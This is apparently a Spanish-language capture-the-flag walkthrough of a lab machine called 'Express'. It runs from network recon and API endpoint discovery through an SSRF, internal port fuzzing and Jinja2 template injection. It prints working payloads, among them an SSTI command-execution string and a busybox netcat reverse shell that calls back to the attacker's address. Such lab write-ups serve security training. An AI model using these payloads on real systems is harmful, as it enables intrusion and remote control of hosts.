---
description: 'Difficulty: Medium'
---

# Express

### Recon

1\. Empezamos haciendo un reconocimiento de red para identificar el host de la máquina víctima:

```bash
sudo nmap -sn 192.168.56.0/24
```

<figure><img src="../../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>

* Host identificados:
  * 192.168.56.1
  * 192.168.56.100
  * 192.168.56.103 (objetivo)
  * 192.168.56.101 (nuestra Kali atacante)

2. Vamos a realizar una enumeración de puertos sobre el objetivo para identificar que servicios está ejecutando, probar scripts contra ellos, etc:

```bash
sudo nmap -sCV -p- --open -T5 192.168.56.103
```

<figure><img src="../../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>

* Puertos identificados:
  * 22/tcp
  * 80/tcp

3. El puerto 80 abierto indica que se está ejecutando un servicio web, así que vamos a probar acceder a la IP del objetivo desde el navegador:

<figure><img src="../../../.gitbook/assets/image (524).png" alt=""><figcaption></figcaption></figure>

* Nos aparece por defecto la página del servidor web que se está ejecutando, que en este caso es Apache 2.

4. Vamos a añadir el dominio de la máquina, que en este caso sería express.nyx al archivo /etc/hosts, apuntando a la IP que hemos identificado, para ver si accediendo desde el dominio vemos algo diferente en el navegador:

<figure><img src="../../../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>

5.  Un paso aconsejable siempre que nos encontramos con una web y no sabemos por donde tirar es hacer lo siguiente:

    1. Entramos en las herramientas del navegador y nos vamos a la pestaña Network:

    <figure><img src="../../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>



b. Recargamos la página a ver si carga algún archivo o algo que nos pueda interesar:

<figure><img src="../../../.gitbook/assets/image (528).png" alt=""><figcaption></figcaption></figure>

* En este caso carga 2 archivos que podrían ser interesantes: **script.js** y **api.js**.

c. Hacemos doble click sobre api.js y se nos abre en el navegador:

<figure><img src="../../../.gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>

* Vemos que las funciones apuntan a diferentes endpoints que pueden resultarnos útiles para la explotación de la máquina.

### JavaScript API Disclosure

En el caso de los endpoints de canciones, no se utiliza ningún parámetro, se hace directamente un get, pero en el caso de los usuarios si que vemos que se utiliza el parámetro key. Otro interesante es /api/admin/availability.

1. Vamos a BurpSuite y hacemos un Intercept de una solicitud a /api/music/list para enviarla al Repeater y trabajar con ella:

<figure><img src="../../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

2. Esta request GET nos devuelve un listado de géneros musicales, probamos con songs:

<figure><img src="../../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

3. Vamos a probar con el otro endpoint que es users, pero sin poner ninguna key, ya que no tenemos ninguna, a ver que mensaje nos devuelve:

<figure><img src="../../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>

* En este punto, el siguiente paso teóricamente sería probar fuzzear las keys de usuario, pero no tenemos ninguna de referencia para hacerlo, podrían ser desde un ID a una key de múltiples números. A veces no hay que buscar complicarlo tanto.

4. Cambiamos el método GET de la request a POST:

<figure><img src="../../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

* Y eso es, nos devuelve un JSON con:
  * id de usuario
  * rol del usuario
  * token del usuario
  * nombre de usuario

5. Cómo podemos ver los roles de usuario, vamos a buscar un usuario admin:

<figure><img src="../../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

6. Probamos a poner su key en el parámetro de /api/users?key${secretKey}:

<figure><img src="../../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

* Pero nos da un 400 Bad Request...parece que no es por donde tenemos que seguir.

7. Entre las funciones de api.js también había una que hacía un POST al endpoint /api/admin/availability, vamos a probar desde Burp:

<figure><img src="../../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

* Nos da un error por el Media Type, ya que sólo admite request en formato JSON.

8. Modificaremos nuestra request añadiendo los siguientes valores:

```json
{
    "id": 18,
    "url": "http://google.com",
    "token": "4493-3179-0912-0597"
}
```

<figure><img src="../../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>

* Por la URL nos da un url\_status: “unreachable” ya que la máquina no tiene salida a internet en este caso.

9. Vamos a realizar otra comprobación, esta vez levantaremos en la máquina atacante un servidor web y apuntaremos el valor URL de la request hacía él:

<figure><img src="../../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>

* En este caso nos da un success y active porque puede llegar hasta la URL. Con esto confirmamos que se trata de un SSRF.

### Explotación

La primera opción, cómo cuando empezamos con un pentest y reconociendo un objetivo, es enumerar los puertos.

1. Creamos una lista con los números de puertos que queremos escanear:

```bash
seq 65535 > puertos.txt
```

<figure><img src="../../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>

2. Después utilizaremos fuff para fuzzear los puertos, utilizando el id, la URL local y el token del admin:

```bash
ffuf -w ./puertos.txt -u http://express.nyx/api/admin/availability -X POST -H "Content-Type: application/json" -d '{"id": 123, "url": "http://127.0.0.1:FUZZ", "token": "4493-3179-0912-0597"}'
```

<figure><img src="../../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>

3. Nos aparece mucho ruido así que vamos a afinar más eliminando los que en Words den un 36:

```bash
ffuf -w ./puertos.txt -u http://express.nyx/api/admin/availability -X POST -H "Content-Type: application/json" -d '{"id": 123, "url": "http://127.0.0.1:FUZZ", "token": "4493-3179-0912-0597"}' -fw 36
```

<figure><img src="../../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>

* Se vuelven a identificar los puertos que ya conociamos (22 y 80) y además otros 3:
  * 5000
  * 9000
  * 55854

4. Probamos con las request de Burpsuite sobre los nuevos puertos descubiertos:

5000

<figure><img src="../../../.gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>

9000

<figure><img src="../../../.gitbook/assets/image (545).png" alt=""><figcaption></figcaption></figure>

55854

<figure><img src="../../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>

* El único que nos da un success y active es el 9000, además podemos observar que hay un formulario para hacer un submit de un nombre de usuario.

5. Vamos a probar a enviar por URL el nombre de un usuario random a ver que nos responde:

<figure><img src="../../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>

6. Vemos que reconoce lo que le pasamos por el parámetro, probaremos si es SSTI:
   1. Para ello utilizamos las siguientes fórmulas:

```
{7*7}
${7*7}
{{7*'7'}}
#{7*7}
%{7*7}
{{7*7}}
```

1. Habrá que tener en cuenta esta teoría:

<figure><img src="../../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>



6. Empezamos con la primera fórmula:

<figure><img src="../../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>

8. No la ejecuta, así que siguiendo el esquema, hay que probar la fórmula de abajo del gráfico:

<figure><img src="../../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

9. Esta si que funciona, por lo que según el esquema es Jinja2 o Twig, dependiendo del resultado de la siguiente fórmula:
   1. Si nos sale 7777777 significa que es Jinja2.
   2. Si nos sale 49 significa que es Twig.

<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

* Confirmamos que es Jinja2.

10. Con el siguiente payload comprobaremos que usuario somos:&#x20;

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Escalada de privilegios

1. Pondremos una consola a la escucha en nuestra máquina atacante:

```bash
nc -lvnp 4444
```

<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

2. Enviaremos una reverse shell con busybox desde la request de Burp en el Repeater:

```
self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.56.101 4444 -e bash').read()
```

<figure><img src="../../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

3. Recibimos la conexión en el terminal a la escucha y ejecutamos comandos:

<figure><img src="../../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>

4. Somos root en el sistema objetivo, ahora vamos a buscar las flags:

<figure><img src="../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>
